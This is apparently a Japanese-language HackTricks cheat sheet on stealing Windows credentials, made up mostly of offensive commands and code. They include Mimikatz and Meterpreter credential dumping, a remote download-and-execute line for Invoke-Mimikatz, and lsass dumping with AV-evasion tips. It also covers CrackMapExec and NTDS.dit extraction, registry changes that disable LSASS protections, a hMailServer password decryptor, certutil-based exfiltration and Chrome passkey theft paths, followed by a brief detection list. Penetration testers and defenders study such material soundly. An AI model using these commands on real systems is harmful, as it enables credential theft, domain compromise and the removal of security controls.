# Windows認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzでできるその他のことは** [**このページ**](credentials-mimikatz.md)**で確認できます。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**認証情報の保護機能についてはこちらをご覧ください。**](credentials-protections.md) **これらの保護機能により、Mimikatz が一部の認証情報を抽出できなくなる可能性があります。**

## Meterpreter による認証情報

私が作成した [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して**、被害者内部の **パスワードとハッシュを検索**します。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVの回避

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**の**Procdumpは正規のMicrosoftツール**であるため、Defenderでは検出されません。\
このツールを使用して**lsass processをdump**し、**dumpをdownload**して、dumpから**credentialsをlocally extract**できます。

[SharpDump](https://github.com/GhostPack/SharpDump)も使用できます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は、**procdump.exe を使用して lsass.exe をダンプする**行為を**悪意のあるもの**として**検知**する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を**検知**しているためです。そのため、procdump に **lsass.exe の名前**を渡す代わりに、lsass.exe の **PID** を**引数**として渡す方が、より**ステルス性が高くなります。**

### **comsvcs.dll** を使用した lsass のダンプ

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ発生時に**プロセスメモリをダンプする**役割を担います。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使用して呼び出すように設計されています。\
最初の2つの引数は使用しても意味がありませんが、3つ目の引数は3つの要素に分かれています。ダンプ対象のプロセス ID が1つ目の要素、ダンプファイルの場所が2つ目、3つ目の要素は必ず **full** という単語になります。代替オプションはありません。\
これら3つの要素が解析されると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをこのファイルに転送します。\
**comsvcs.dll** を使用して lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) で説明されています。

実行には次のコマンドを使用します:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerを使用したlsassのダンプ**

1. Task Barを右クリックし、Task Managerをクリックします
2. More detailsをクリックします
3. Processesタブで「Local Security Authority Process」プロセスを検索します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdumpを使用したlsassのダンプ

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部であるMicrosoft署名済みバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade による lsass の Dump

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリ dump を obfuscate し、ディスクに保存せずにリモートワークステーションへ転送できる Protected Process Dumper Tool です。

**主な機能**:

1. PPL protection の bypass
2. Defender の signature-based detection mechanisms を回避するためのメモリ dump ファイルの obfuscation
3. ディスクに保存せずに RAW および SMB upload methods でメモリ dump を upload（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper - MiniDumpWriteDump を使用しない SSP-based LSASS dumping

Ink Dragon には **LalsDumper** という3段階の dumper が含まれており、`MiniDumpWriteDump` を一度も呼び出さないため、この API に対する EDR hook は発生しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** - `fdp.dll` 内から32個の小文字の `d` で構成された placeholder を検索し、それを `rtu.txt` の絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、**LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) としてロードします。
2. **LSASS 内の Stage 2** - LSASS が `nfdp.dll` をロードすると、DLL は `rtu.txt` を読み込み、各 byte を `0x20` と XOR し、decode した blob を memory に map してから実行へ移行します。
3. **Stage 3 dumper** - map された payload は、hash 化された API 名（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）から解決した **direct syscalls** を使用して、MiniDump の logic を再実装します。`Tom` という専用 export は `%TEMP%\<pid>.ddt` を開き、compressed な LSASS dump を file に stream してから handle を閉じるため、後で exfiltration を実行できます。

Operator notes:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じ directory に置いてください。Stage 1 は hard-coded placeholder を `rtu.txt` の絶対パスで書き換えるため、これらを分離すると chain が壊れます。
* Registration は `nfdp` を `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に append することで行われます。この value を自分で seed しておけば、LSASS が boot のたびに SSP を reload するようにできます。
* `%TEMP%\*.ddt` files は compressed dumps です。local で decompress してから、credential extraction のために Mimikatz/Volatility に渡してください。
* `lals.exe` の実行には admin/SeTcb rights が必要で、これにより `AddSecurityPackageA` が成功します。call が return すると、LSASS は rogue SSP を透過的にロードして Stage 2 を実行します。
* disk から DLL を削除しても、LSASS から evict されるわけではありません。registry entry を削除して LSASS を restart（reboot）するか、long-term persistence のために残しておいてください。

## CrackMapExec

### SAM hash を dumpする
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets のダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### target DC から NTDS.dit を Dump
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 対象DCからNTDS.ditのパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM と SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM_ に**存在するはずです**。しかし、**保護されているため、通常の方法で単純にコピーすることはできません**。

### レジストリから

これらのファイルを窃取する最も簡単な方法は、レジストリからコピーを取得することです。
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**ダウンロード**してKaliマシンに保存し、以下を使用して**ハッシュを抽出**します:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin バイナリは Windows Server バージョンでのみ利用可能です
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、同じことを **Powershell** から実行することもできます。これは **SAM file をコピーする方法** の例です（使用するハードドライブは「C:」で、C:\users\Public に保存されます）が、これを任意の保護されたファイルのコピーに使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザーオブジェクト、グループ、それらのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** に存在します。

このデータベースでは、主に次の3つのテーブルが管理されています。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細を保存します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **security descriptors** がここに保持され、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

詳細については、こちらを参照してください: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows はこのファイルとやり取りするために _Ntdsa.dll_ を使用し、これは _lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** のメモリ内に存在する可能性があります（パフォーマンス向上のために **cache** が使用されることから、最新のアクセスデータを確認できる可能性があります）。

#### NTDS.dit 内の hash の復号

hash は3回復号されます。

1. **BOOTKEY** と **RC4** を使用して Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使用して **hash** を復号する。
3. **DES** を使用して **hash** を復号する。

**PEK** は**すべてのドメインコントローラーで同じ値**ですが、**ドメインコントローラーの SYSTEM ファイルの** **BOOTKEY**（**ドメインコントローラーごとに異なります**）を使用して **NTDS.dit** ファイル内で**暗号化**されています。そのため、NTDS.dit ファイルから認証情報を取得するには、NTDS.dit と SYSTEM のファイル（_C:\Windows\System32\config\SYSTEM_）が必要です。

### Copying NTDS.dit using Ntdsutil

Windows Server 2008 以降で利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM ファイル**のコピーも必要になることを覚えておいてください（再度、[**レジストリから dump するか、volume shadow copy**](#stealing-sam-and-system) の手法を使用します）。

### **NTDS.dit から hash を抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**取得**したら、_secretsdump.py_ などのツールを使って **hash を抽出**できます：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して、**自動的に抽出**することもできます。
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きな NTDS.dit ファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit から SQLite データベースへの domain objects の抽出**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使用すると、NTDS objects を SQLite データベースに抽出できます。secrets だけでなく、raw NTDS.dit ファイルをすでに取得している場合に、さらなる情報抽出を行うための objects 全体とその attributes も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive はオプションですが、secrets の復号（NT および LM hashes、cleartext passwords などの supplemental credentials、kerberos または trust keys、NT および LM password histories）を可能にします。その他の情報とともに、次のデータが抽出されます：hashes 付きの user および machine accounts、UAC flags、last logon および password change の timestamp、accounts description、names、UPN、SPN、groups および recursive memberships、organizational units の tree と membership、trusts の type、direction、attributes を含む trusted domains など。

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary を download します。この binary を使用すると、複数の software から credentials を抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から credentials を抽出するその他のツール

### Windows credentials Editor (WCE)

この tool は memory から credentials を抽出するために使用できます。以下から download してください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file から credentials を抽出します
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM fileからcredentialsをExtractする
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

以下からダウンロードします:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) そして単に**実行するだけで**パスワードが抽出されます。

## アイドル状態の RDP セッションの探索とセキュリティ制御の弱体化

Ink Dragon の FinalDraft RAT には、あらゆる red-teamer に役立つ手法を備えた `DumpRDPHistory` tasker が含まれています:<sup>[[3]](#references)</sup>

### DumpRDPHistory 形式のテレメトリ収集

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にあるすべてのユーザーハイブを解析します。各サブキーには、サーバー名、`UsernameHint`、および最終書き込みタイムスタンプが保存されています。PowerShell で FinalDraft のロジックを再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログから Event ID **21**（ログオン成功）および **25**（切断）をクエリし、誰がそのホストを管理していたかを特定します:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかを把握したら、その**切断済み**セッションがまだ存在している間に、LSASS を（LalsDumper/Mimikatz で）ダンプします。CredSSP + NTLM fallback により、検証情報とトークンが LSASS に残るため、それらを SMB/WinRM 経由で replay し、`NTDS.dit` を取得したり、domain controller 上で persistence を確立したりできます。

### FinalDraft が標的にする Registry のダウングレード

同じ implant は、credential theft を容易にするため、複数の Registry key も改ざんします:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP 接続時に完全な credential/ticket 再利用が強制され、pass-the-hash 型のピボットが可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効化し、local admin がネットワーク経由で制限のない token を取得できるようにします。
* `DSRMAdminLogonBehavior=2` を設定すると、DC がオンラインの状態でも DSRM administrator がログオンできるようになり、攻撃者に別の組み込み high-privilege account を与えます。
* `RunAsPPL=0` は LSASS PPL protections を解除し、LalsDumper などの dumper によるメモリアクセスを容易にします。

## hMailServer データベース認証情報 (post-compromise)

hMailServer は DB password を `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` の `[Database] Password=` に保存します。この値は static key `THIS_KEY_IS_NOT_SECRET` と 4-byte word endianness swaps を使用して Blowfish で暗号化されています。INI の hex string を次の Python snippet で使用します:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
平文パスワードを使用して、ファイルロックを回避するために SQL CE データベースをコピーし、32-bit provider をロードして、ハッシュをクエリする前に必要に応じてアップグレードします。
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` カラムは hMailServer の hash format（hashcat mode `1421`）を使用します。これらの値を cracking することで、WinRM/SSH pivots に再利用可能な credentials を取得できます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部の tooling は、LSA logon callback `LsaApLogonUserEx2` を intercept することで、**plaintext logon passwords** を capture します。これは、authentication package の callback を hook または wrap し、credentials を **logon 中**（hashing 前）に capture してから disk に書き込むか、operator に返すという方法です。通常は、LSA に inject または register する helper として実装され、成功した各 interactive/network logon event について、username、domain、password を記録します。<sup>[[1]](#references)</sup>

Operational notes:
- authentication path に helper を load するには、local admin/SYSTEM が必要です。
- Captured credentials は logon が発生した場合にのみ表示されます（hook に応じて、interactive、RDP、service、または network logon）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、saved connection information を per-user の `sqlstudio.bin` file に保存します。専用の dumpers はこの file を parse し、saved SQL credentials を recover できます。command output のみを返す shells では、file を Base64 として encoding し、stdout に print して exfiltrate することがよくあります。<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
オペレーター側でファイルを再ビルドし、dumperをローカルで実行して認証情報を復元します：
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Chrome on Windows からの Passkeys / WebAuthn credential theft

Windows ホスト上で **Chrome + Google Password Manager synced passkeys** を使用している **victim user** として code execution を取得した場合、admin/SYSTEM なしでも passkeys は興味深い post-exploitation のターゲットになります。<sup>[[4]](#references)</sup>

### 注目すべきローカルアーティファクト
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** には、protobuf でエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期された passkeys の **RP ID**、**username**、**credential ID**、および暗号化された秘密鍵マテリアルを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** などのローカルデバイス登録状態と、同期された認証情報の復元に使用されるラップ済みシークレットが保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs は依然として local signing oracle として悪用できる

ブラウザが **`NCRYPT_OPAQUE_KEY_BLOB`** として TPM-backed identity key をエクスポートし、その blob を user-accessible state に保存している場合、malware は raw private key を抽出する必要がありません。単に **same machine** 上でその blob を再インポートし、local TPM に attacker-controlled data への署名を要求できます:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
これは、**hardware bindingはデバイス外へのexportを防止するが、侵害されたendpoint上での同一ユーザーによる使用は防止しない**ことを意味します。

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- ChromeのLevelDBから`WebauthnCredentialSpecifics`を列挙する。
- passkey loginを開始し、新しいWebAuthn challengeを取得する。
- 盗み出した`wrapped_identity_private_key` blobをvictim TPM上で使用し、cloud-authenticator request bindingに署名する。
- 返されたassertionをrelying partyにrelayする。
- これは、RPが`userVerification=preferred`を受け入れる場合や、**`UV=0`**のassertionを拒否しない場合に特に有効である。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state`を削除するか、正しく署名された`device/forget` operationを送信してre-onboardingを強制する。
- onboarding後にデバイスが**`uv_key_pending`**の状態になった場合、attackerが管理するUV public keyを登録する。
- providerが新しいUV keyについてattestation / secure-hardware originを検証しない場合、以降のattacker keyによる署名は**`UV=1`**として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- recoveryまたはrejoinを強制し、Chromeにsynced-passkey master secretを取得させる。
- `passkey_enclave_state`の再作成または変更を監視し、その後、平文の**security domain secret (SDS)**がresidentである間にChrome memoryをdumpする。
- 回収したSDSを使用して、すべての`WebauthnCredentialSpecifics` record内のencrypted fieldsを復号し、portable WebAuthn private keysを回収する。

### DFIR / detection ideas

- `passkey_enclave_state`の**削除/再作成**を監視する。<sup>[[4]](#references)</sup>
- browser以外のprocessによるChromeの**`Sync Data\LevelDB`**への異常なaccessをalertする。
- **Chrome memory dumps**または疑わしいcross-process memory accessをalertする。
- 繰り返し表示される**Google Password Manager recovery PIN** promptsや、予期しないre-onboardingを調査する。
- WebAuthnの**`signCount`**は、synced passkeysでは一定のままになることがあるため役に立たない場合が多く、従来のclone detectionは弱いことに注意する。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年検知されなかったOperationに関する調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532によるSYSTEM取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: ステルス性の高いOffensive OperationにおけるRelay Networkと内部動作の解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Passwordless Authenticationにおける新たなAttack Surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Microsoft Systems and Networksへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Storeの実際の動作: NTDS.ditの内部 (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
